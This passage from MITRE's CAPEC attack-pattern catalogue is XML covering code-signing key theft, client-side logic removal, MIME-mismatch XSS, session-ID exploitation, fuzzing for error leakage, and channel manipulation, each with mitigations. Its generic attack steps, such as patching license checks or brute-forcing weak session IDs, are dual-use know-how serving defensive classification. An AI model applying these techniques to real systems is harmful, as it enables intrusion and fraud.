         <Description>The attacker extracts credentials used for code signing from a production environment and then uses these credentials to sign malicious content with the developer's key. Many developers use signing keys to sign code or hashes of code. When users or applications verify the signatures are accurate they are led to believe that the code came from the owner of the signing key and that the code has not been modified since the signature was applied. If the attacker has extracted the signing credentials then they can use those credentials to sign their own code bundles. Users or tools that verify the signatures attached to the code will likely assume the code came from the legitimate developer and install or run the code, effectively allowing the attacker to execute arbitrary code on the victim's computer.</Description>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="68"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The targeted developer must use a signing key to sign code bundles. (Note that not doing this is not a defense - it only means that the attacker does not need to steal the signing key before forging code bundles in the developer's name.)</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="732"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1116</Entry_ID>
               <Entry_Name>Code Signing</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description Summary, Related_Weaknesses</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2018-07-31">Lifting signing key and signing malicious code from a production environment</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="207" Name="Removing Important Client Functionality" Abstraction="Standard" Status="Draft">
         <Description>An attacker removes or disables functionality on the client that the server assumes to be present and trustworthy. Attackers can, in some cases, get around logic put in place to 'guard' sensitive functionality or data. Client applications may include functionality that a server relies on for correct and secure operation. This functionality can include, but is not limited to, filters to prevent the sending of dangerous content to the server, logical functionality such as price calculations, and authentication logic to ensure that only authorized users are utilizing the client. If an attacker can disable this functionality on the client, they can perform actions that the server believes are prohibited. This can result in client behavior that violates assumptions by the server leading to a variety of possible attacks. In the above examples, this could include the sending of dangerous content (such as scripts) to the server, incorrect price calculations, or unauthorized access to server resources.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="22">
               <Exclude_Related Exclude_ID="512"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Probing] The attacker probes, through brute-forcing, reverse-engineering or other similar means, the functionality on the client that server assumes to be present and trustworthy.</Description>
               <Technique>The attacker probes by exploring an application's functionality and its underlying mapping to server-side components.</Technique>
               <Technique>The attacker reverse engineers client-side code to identify the functionality that the server relies on for the proper or secure operation.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Determine which functionality to disable or remove] The attacker tries to determine which functionality to disable or remove through reverse-engineering from the list of functionality identified in the Explore phase.</Description>
               <Technique>The attacker reverse engineers the client-side code to determine which functionality to disable or remove.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Disable or remove the critical functionality from the client code] Once the functionality has been determined, the attacker disables or removes the critical functionality from the client code to perform malicious actions that the server believes are prohibited.</Description>
               <Technique>The attacker disables or removes the functionality from the client-side code to perform malicious actions, such as sending of dangerous content (such as scripts) to the server.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The targeted server must assume the client performs important actions to protect the server or the server functionality. For example, the server may assume the client filters outbound traffic or that the client performs all price calculations correctly. Moreover, the server must fail to detect when these assumptions are violated by a client.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">To reverse engineer the client-side code to disable/remove the functionality on the client that the server relies on.</Skill>
            <Skill Level="Low">The attacker installs a web tool that allows scripts or the DOM model of web-based applications to be modified before they are executed in a browser. GreaseMonkey and Firebug are two examples of such tools.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>The attacker must have access to a client and be able to modify the client behavior, often through reverse engineering. If the server is assuming specific client functionality, this usually means the server only recognizes a specific client application, rather than a broad class of client applications. Reverse engineering tools would likely be necessary.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
               <Note>Information Leakage</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Accountability</Scope>
               <Scope>Authentication</Scope>
               <Scope>Authorization</Scope>
               <Scope>Non-Repudiation</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side.</Mitigation>
            <Mitigation>Design: Ship client-side application with integrity checks (code signing) when possible.</Mitigation>
            <Mitigation>Design: Use obfuscation and other techniques to prevent reverse engineering the client code.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Attacker reverse engineers a Java binary (by decompiling it) and identifies where license management code exists. Noticing that the license manager returns TRUE or FALSE as to whether or not the user is licensed, the Attacker simply overwrites both branch targets to return TRUE, recompiles, and finally redeploys the binary.</Example>
            <Example>Attacker uses click-through exploration of a Servlet-based website to map out its functionality, taking note of its URL-naming conventions and Servlet mappings. Using this knowledge and guessing the Servlet name of functionality they're not authorized to use, the Attacker directly navigates to the privileged functionality around the authorizing single-front controller (implementing programmatic authorization checks).</Example>
            <Example>Attacker reverse-engineers a Java binary (by decompiling it) and identifies where license management code exists. Noticing that the license manager returns TRUE or FALSE as to whether or not the user is licensed, the Attacker simply overwrites both branch targets to return TRUE, recompiles, and finally redeploys the binary.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="602"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-75" Section="Greasemonkey"/>
            <Reference External_Reference_ID="REF-76"/>
            <Reference External_Reference_ID="REF-77" Section="Greasemonkey"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, References, Related_Vulnerabilities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Consequences, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-12-07">Removing Important Functionality from the Client</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="208" Name="Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements" Abstraction="Detailed" Status="Draft">
         <Description>An attacker removes or modifies the logic on a client associated with monetary calculations resulting in incorrect information being sent to the server. A server may rely on a client to correctly compute monetary information. For example, a server might supply a price for an item and then rely on the client to correctly compute the total cost of a purchase given the number of items the user is buying. If the attacker can remove or modify the logic that controls these calculations, they can return incorrect values to the server. The attacker can use this to make purchases for a fraction of the legitimate cost or otherwise avoid correct billing for activities.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="207"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The targeted server must rely on the client to correctly perform monetary calculations and must fail to detect errors in these calculations.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The attacker must have access to the client for the targeted service (this step is trivial for most web-based services). The attacker must also be able to reverse engineer the client in order to locate and modify the client's purse logic. Reverse engineering tools would be necessary for this.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="602"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="209" Name="XSS Using MIME Type Mismatch" Abstraction="Detailed" Status="Draft">
         <Description>An adversary creates a file with scripting content but where the specified MIME type of the file is such that scripting is not expected. The adversary tricks the victim into accessing a URL that responds with the script file. Some browsers will detect that the specified MIME type of the file does not match the actual type of its content and will automatically switch to using an interpreter for the real content type. If the browser does not invoke script filters before doing this, the adversary's script may run on the target unsanitized, possibly revealing the victim's cookies or executing arbitrary script in their browser.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="592"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The victim must follow a crafted link that references a scripting file that is mis-typed as a non-executable file.</Prerequisite>
            <Prerequisite>The victim's browser must detect the true type of a mis-labeled scripting file and invoke the appropriate script interpreter without first performing filtering on the content.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The adversary must have the ability to source the file of the incorrect MIME type containing a script.</Resource>
         </Resources_Required>
         <Example_Instances>
            <Example>For example, the MIME type text/plain may be used where the actual content is text/javascript or text/html. Since text does not contain scripting instructions, the stated MIME type would indicate that filtering is unnecessary. However, if the target application subsequently determines the file's real type and invokes the appropriate interpreter, scripted content could be invoked.</Example>
            <Example>In another example, img tags in HTML content could reference a renderable type file instead of an expected image file. The file extension and MIME type can describe an image file, but the file content can be text/javascript or text/html resulting in script execution. If the browser assumes all references in img tags are images, and therefore do not need to be filtered for scripts, this would bypass content filters.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="79"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="646"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-78" Section="Testing for Stored Cross site scripting (OWASP-DV-002)"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Description Summary, Examples-Instances, Injection_Vector, Payload, Payload_Activation_Impact, Related_Attack_Patterns, Related_Weaknesses, Resources_Required</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-05-01">Cross-Site Scripting Using MIME Type Mismatch</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="21" Name="Exploitation of Trusted Credentials" Abstraction="Meta" Status="Draft">
         <Description>Attacks on session IDs and resource IDs take advantage of the fact that some software accepts user input without verifying its authenticity. For example, a message queuing system that allows service requesters to post messages to its queue through an open channel (such as anonymous FTP), authorization is done through checking group or role membership contained in the posted message. However, there is no proof that the message itself, the information in the message (such group or role membership), or indeed the process that wrote the message to the queue are authentic and authorized to do so. Many server side processes are vulnerable to these attacks because the server to server communications have not been analyzed from a security perspective or the processes "trust" other systems because they are behind a firewall. In a similar way servers that use easy to guess or spoofable schemes for representing digital identity can also be vulnerable. Such systems frequently use schemes without cryptography and digital signatures (or with broken cryptography). Session IDs may be guessed due to insufficient randomness, poor protection (passed in the clear), lack of integrity (unsigned), or improperly correlation with access control policy enforcement points. Exposed configuration and properties files that contain system passwords, database connection strings, and such may also give an attacker an edge to identify these identifiers. The net result is that spoofing and impersonation is possible leading to an attacker's ability to break authentication, authorization, and audit controls on the system.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Survey the application for Indicators of Susceptibility] Using a variety of methods, until one is found that applies to the target system. the attacker probes for credentials, session tokens, or entry points that bypass credentials altogether.</Description>
               <Technique>Spider all available pages</Technique>
               <Technique>Attack known bad interfaces</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Fetch samples] An attacker fetches many samples of a session ID. This may be through legitimate access (logging in, legitimate connections, etc) or just systematic probing.</Description>
               <Technique>An attacker makes many anonymous connections and records the session IDs assigned.</Technique>
               <Technique>An attacker makes authorized connections and records the session tokens or credentials issued.</Technique>
               <Technique>An attacker gains access to (legitimately or illegitimately) a nearby system (e.g., in the same operations network, DMZ, or local network) and makes a connections from it, attempting to gain the same privileges as a trusted system.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Impersonate] An attacker can use successful experiments to impersonate an authorized user or system</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Spoofing] Bad data can be injected into the system by an attacker.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>Server software must rely on weak session IDs proof and/or verification schemes</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To achieve a direct connection with the weak or non-existent server session access control, and pose as an authorized user</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Ability to deploy software on network. Ability to communicate synchronously or asynchronously with server</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: utilize strong federated identity such as SAML to encrypt and sign identity tokens in transit.</Mitigation>
            <Mitigation>Implementation: Use industry standards session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf.</Mitigation>
            <Mitigation>Implementation: If the session identifier is used for authentication, such as in the so-called single sign on use cases, then ensure that it is protected at the same level of assurance as authentication tokens.</Mitigation>
            <Mitigation>Implementation: If the web or application server supports it, then encrypting and/or signing the session ID (such as cookie) can protect the ID if intercepted.</Mitigation>
            <Mitigation>Design: Use strong session identifiers that are protected in transit and at rest.</Mitigation>
            <Mitigation>Implementation: Utilize a session timeout for all sessions, for example 20 minutes. If the user does not explicitly logout, the server terminates their session after this period of inactivity. If the user logs back in then a new session key is generated.</Mitigation>
            <Mitigation>Implementation: Verify of authenticity of all session IDs at runtime.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>Thin client applications like web applications are particularly vulnerable to session ID attacks. Since the server has very little control over the client, but still must track sessions, data, and objects on the server side, cookies and other mechanisms have been used to pass the key to the session data between the client and server. When these session keys are compromised it is trivial for an attacker to impersonate a user's session in effect, have the same capabilities as the authorized user. There are two main ways for an attacker to exploit session IDs.</xhtml:p>
               <xhtml:p>A brute force attack involves an attacker repeatedly attempting to query the system with a spoofed session header in the HTTP request. A web server that uses a short session ID can be easily spoofed by trying many possible combinations so the parameters session-ID= 1234 has few possible combinations, and an attacker can retry several hundred or thousand request with little to no issue on their side.</xhtml:p>
               <xhtml:p>The second method is interception, where a tool such as wireshark is used to sniff the wire and pull off any unprotected session identifiers. The attacker can then use these variables and access the application.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="290"/>
            <Related_Weakness CWE_ID="302"/>
            <Related_Weakness CWE_ID="346"/>
            <Related_Weakness CWE_ID="539"/>
            <Related_Weakness CWE_ID="6"/>
            <Related_Weakness CWE_ID="384"/>
            <Related_Weakness CWE_ID="664"/>
            <Related_Weakness CWE_ID="602"/>
            <Related_Weakness CWE_ID="642"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-11-09">Exploitation of Session Variables, Resource IDs and other Trusted Credentials</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="212" Name="Functionality Misuse" Abstraction="Meta" Status="Stable">
         <Description>An adversary leverages a legitimate capability of an application in such a way as to achieve a negative technical impact. The system functionality is not altered or modified but used in a way that was not intended. This is often accomplished through the overuse of a specific functionality or by leveraging functionality with design flaws that enables the adversary to gain access to unauthorized, sensitive data.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Prerequisites>
            <Prerequisite>The adversary has the capability to interact with the application directly.The target system does not adequately implement safeguards to prevent misuse of authorized actions/processes.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">General computer knowledge about how applications are launched, how they interact with input/output, and how they are configured.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Gain Privileges</Impact>
               <Note>A successful attack of this kind can compromise the confidentiality of an authorized user's credentials.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Other</Impact>
               <Note>Depending on the adversary's intended technical impact, a successful attack of this kind can compromise any or all elements of the security triad.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Perform comprehensive threat modeling, a process of identifying, evaluating, and mitigating potential threats to the application. This effort can help reveal potentially obscure application functionality that can be manipulated for malicious purposes.</Mitigation>
            <Mitigation>When implementing security features, consider how they can be misused and compromised.</Mitigation>
         </Mitigations>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Description Summary, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Solutions_and_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attacker_Skills_or_Knowledge_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="214" Name="Fuzzing for garnering J2EE/.NET-based stack traces, for application mapping" Abstraction="Detailed" Status="Draft">
         <Description>An attacker sends random, malformed, or otherwise unexpected messages to a target application and observes any stack traces produced by error messages. Fuzzing techniques involve sending random or malformed messages to a target and monitoring the target's response. The attacker does not initially know how a target will respond to individual messages but by attempting a large number of message variants they may find a variant that trigger's desired behavior. In this attack, the purpose of the fuzzing is to cause the targeted application to return an error including a stack trace, although fuzzing a target can also sometimes cause the target to enter an unstable state, causing a crash. The stack trace enumerates the chain of methods that led up to the point where the error was encountered. This can not only reveal the names of the methods (some of which may have known weaknesses) but possibly also the location of class files and libraries as well as parameter values. In some cases, the stack trace might even disclose sensitive configuration or user information.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="54"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The target application must fail to sanitize incoming messages adequately before processing and must generate a stack trace in at least some error situations.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The attacker must have sufficient access to send messages to the target. The attacker must also have the ability to observe the stack trace produced by the target application. Fuzzing tools, which automatically generate and send message variants, are necessary for this attack.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="209"/>
            <Related_Weakness CWE_ID="388"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="215" Name="Fuzzing and observing application log data/errors for application mapping" Abstraction="Detailed" Status="Draft">
         <Description>An attacker sends random, malformed, or otherwise unexpected messages to a target application and observes the application's log or error messages returned. Fuzzing techniques involve sending random or malformed messages to a target and monitoring the target's response. The attacker does not initially know how a target will respond to individual messages but by attempting a large number of message variants they may find a variant that trigger's desired behavior. In this attack, the purpose of the fuzzing is to observe the application's log and error messages, although fuzzing a target can also sometimes cause the target to enter an unstable state, causing a crash. By observing logs and error messages, the attacker can learn details about the configuration of the target application and might be able to cause the target to disclose sensitive information.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="54"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Probing] The attacker uses fuzzing tools to send random malformed messages to web server and observes for server's log or error message.</Description>
               <Technique>The attacker uses fuzzing tools to send random malformed messages to web server and observes for server's log or error message.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Modify the parameters to get the desired information from the error messages.] Attacker usually needs to modify the fuzzing parameters according to the observed error messages to get the desired sensitive information for the application. To defeat correlation, the attacker may try changing the origin IP addresses or client browser identification strings or start a new session from where he left off in obfuscating the attack.</Description>
               <Technique>Modify the parameters in the fuzzing tool according to the observed error messages. Repeat with enough parameters until the application has been sufficiently mapped.</Technique>
               <Technique>If the application rejects the large amount of fuzzing messages from the same host machine, the attacker needs to hide the attacks by changing the IP addresses or other credentials.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The target application must fail to sanitize incoming messages adequately before processing.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Although fuzzing parameters is not difficult, and often possible with automated fuzzing tools, interpreting the error conditions and modifying the parameters so as to move further in the process of mapping the application requires detailed knowledge of target platform, the languages and packages used as well as software design.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Fuzzing tools, which automatically generate and send message variants, are necessary for this attack. The attacker must have sufficient access to send messages to the target. The attacker must also have the ability to observe the target application's log and/or error messages in order to collect information about the target.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
               <Note>Information Leakage</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Construct a 'code book' for error messages. When using a code book, application error messages aren't generated in string or stack trace form, but are catalogued and replaced with a unique (often integer-based) value 'coding' for the error. Such a technique will require helpdesk and hosting personnel to use a 'code book' or similar mapping to decode application errors/logs in order to respond to them normally.</Mitigation>
            <Mitigation>Design: wrap application functionality (preferably through the underlying framework) in an output encoding scheme that obscures or cleanses error messages to prevent such attacks. Such a technique is often used in conjunction with the above 'code book' suggestion.</Mitigation>
            <Mitigation>Implementation: Obfuscate server fields of HTTP response.</Mitigation>
            <Mitigation>Implementation: Hide inner ordering of HTTP response header.</Mitigation>
            <Mitigation>Implementation: Customizing HTTP error codes such as 404 or 500.</Mitigation>
            <Mitigation>Implementation: Hide HTTP response header software information filed.</Mitigation>
            <Mitigation>Implementation: Hide cookie's software information filed.</Mitigation>
            <Mitigation>Implementation: Obfuscate database type in Database API's error message.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>The following code generates an error message that leaks the full pathname of the configuration file.</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="bad">$ConfigDir = "/home/myprog/config";<xhtml:br/>$uname = GetUserInput("username");<xhtml:br/>ExitError("Bad hacker!") if ($uname !~ /^\w+$/);<xhtml:br/>$file = "$ConfigDir/$uname.txt";<xhtml:br/>if (! (-e $file)) { ExitError("Error: $file does not exist"); }<xhtml:br/>...</xhtml:div>
               <xhtml:p>If this code is running on a server, such as a web application, then the person making the request should not know what the full pathname of the configuration directory is. By submitting a username that does not produce a $file that exists, an attacker could get this pathname. It could then be used to exploit path traversal or symbolic link following problems that may exist elsewhere in the application.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="209"/>
            <Related_Weakness CWE_ID="532"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="216" Name="Communication Channel Manipulation" Abstraction="Meta" Status="Stable">
         <Description>An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.</Description>
         <Prerequisites>
            <Prerequisite>The target application must leverage an open communications channel.</Prerequisite>
            <Prerequisite>The channel on which the target communicates must be vulnerable to interception (e.g., man in the middle attack).</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>A tool that is capable of viewing network traffic and generating custom inputs to be used in the attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Read Data</Impact>
               <Impact>Modify Data</Impact>
               <Impact>Other</Impact>
               <Note>The adversary's injection of additional content into a communication channel negatively impacts the integrity of that channel.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
               <Note>A successful Communication Channel Manipulation attack can result in sensitive information exposure to the adversary, thereby compromising the communication channel's confidentiality.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Encrypt all sensitive communications using properly-configured cryptography.</Mitigation>
            <Mitigation>Design the communication system such that it associates proper authentication/authorization with each channel/message.</Mitigation>
         </Mitigations>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description Summary, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
